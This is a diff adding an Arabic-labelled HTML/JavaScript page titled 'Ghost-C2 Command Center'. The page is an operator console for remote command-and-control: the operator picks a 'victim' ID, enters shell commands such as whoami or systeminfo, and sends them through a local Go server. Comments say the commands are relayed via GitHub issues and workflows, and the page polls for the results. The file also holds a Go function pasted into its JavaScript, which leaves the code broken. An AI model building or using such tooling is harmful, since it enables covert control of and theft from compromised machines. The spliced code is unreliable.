@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost-C2 | القائد العام</title>
+    <style>
+        :root { --main-green: #00ff41; --bg-dark: #0a0a0a; --panel-bg: #141414; }
+        body { background-color: var(--bg-dark); color: var(--main-green); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
+        .container { max-width: 900px; margin: auto; }
+        .header { text-align: center; border-bottom: 2px solid var(--main-green); padding-bottom: 10px; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 3px; }
+        
+        .control-panel { background: var(--panel-bg); padding: 25px; border-radius: 12px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0, 255, 65, 0.1); }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 0.9rem; }
+        input { width: 100%; padding: 12px; background: #000; border: 1px solid #444; color: var(--main-green); border-radius: 6px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: var(--main-green); }
+        
+        button { width: 100%; padding: 15px; background: var(--main-green); color: #000; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        button:hover { background: #00cc33; transform: translateY(-2px); }
+
+        .monitor-section { margin-top: 30px; }
+        #terminal { background: #000; border: 1px solid #333; height: 350px; padding: 15px; overflow-y: auto; border-radius: 8px; font-family: 'Courier New', monospace; line-height: 1.6; }
+        .log-entry { margin-bottom: 8px; border-left: 3px solid #333; padding-left: 10px; }
+        .log-success { border-left-color: var(--main-green); color: #fff; }
+        .log-cmd { color: #00bfff; font-weight: bold; }
+        .result-box { background: #1a1a1a; padding: 10px; margin-top: 10px; border-radius: 4px; color: #ffbc00; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+  
+<div class="container">
+    <div class="header">
+        <h1>GHOST-C2 COMMAND CENTER</h1>
+    </div>
+
+    <div class="control-panel">
+        <div class="input-group">
+            <label>رقم معرف الضحية (Target Issue ID):</label>
+            <input type="number" id="targetId" placeholder="مثلاً: 1" value="1">
+        </div>
+
+        <div class="input-group">
+            <label>الأمر (Command):</label>
+            <input type="text" id="commandInput" placeholder="dir, ls, whoami, systeminfo...">
+        </div>
+
+        <button onclick="sendCommand()">تنفيذ الهجوم (Step 2)</button>
+    </div>
+
+    <div class="monitor-section">
+        <label>شاشة المراقبة اللحظية:</label>
+        <div id="terminal">
+            <div class="log-entry">[SYSTEM] الأنظمة جاهزة.. في انتظار أوامر القائد.</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const terminal = document.getElementById('terminal');
+
+    async function sendCommand() {
+        const id = document.getElementById('targetId').value;
+        const cmd = document.getElementById('commandInput').value;
+
+        if(!id || !cmd) return alert("يا جنرال.. البيانات ناقصة!");
+
+        log(`[>] جاري إرسال الأمر: <span class="log-cmd">${cmd}</span> للضحية #${id}`, 'log-success');
+
+        try {
+            // الاتصال بسيرفر Go المحلي
+            const resp = await fetch('http://localhost:8080/send-command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ issue_no: parseInt(id), command: cmd })
+            });
+
+            if(resp.ok) {
+                log(`[✔] الخطوة 3 نجحت: الأمر وصل لجيت هاب بنجاح.`);
+                // بدء فحص النتيجة تلقائياً
+                startPolling();
+            } else {
+                log(`[X] خطأ: السيرفر رد بحالة فشل.`, 'log-error');
+            }
+        } catch (e) {
+            log(`[X] خطأ: تأكد من تشغيل سيرفر الـ Go (control_server.go)`, 'log-error');
+        }
+    }
+
+        func handleSendCommand(w http.ResponseWriter, r *http.Request) {
+    // اضف السطرين دول في أول الدالة للسماح بالاتصال من GitHub Pages
+    w.Header().Set("Access-Control-Allow-Origin", "*") 
+    w.Header().Set("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
+    w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
+
+    if r.Method == "OPTIONS" {
+        return
+    }
+    // باقي الكود بتاعك كمل زي ما هو...
+}
+        function log(msg, className = '') {
+        const div = document.createElement('div');
+        div.className = `log-entry ${className}`;
+        div.innerHTML = `${new Date().toLocaleTimeString()} - ${msg}`;
+        terminal.appendChild(div);
+        terminal.scrollTop = terminal.scrollHeight;
+    }
+
+
+  
+    // وظيفة لجلب النتيجة الأخيرة من السيرفر (Polling)
+    async function startPolling() {
+        log(`[*] جاري انتظار النتيجة من الـ Workflow (الخطوات 12-18)...`);
+        
+        const poll = setInterval(async () => {
+            try {
+                // بنحاول نقرأ ملف last_result.txt اللي السيرفر بيحدثه
+                const resp = await fetch('http://localhost:8080/last_result.txt');
+                if(resp.ok) {
+                    const data = await resp.text();
+                    if(data && data.length > 5) {
+                        log(`[✅] استلمت النتيجة النهائية (Step 18):`);
+                        const resBox = document.createElement('div');
+                        resBox.className = 'result-box';
+                        resBox.innerHTML = data;
+                        terminal.appendChild(resBox);
+                        terminal.scrollTop = terminal.scrollHeight;
+                        clearInterval(poll); // وقف الفحص لما النتيجة توصل
+                    }
+                }
+            } catch (e) {}
+        }, 5000); // فحص كل 5 ثواني
+    }
+</script>
+
+</body>
+</html>
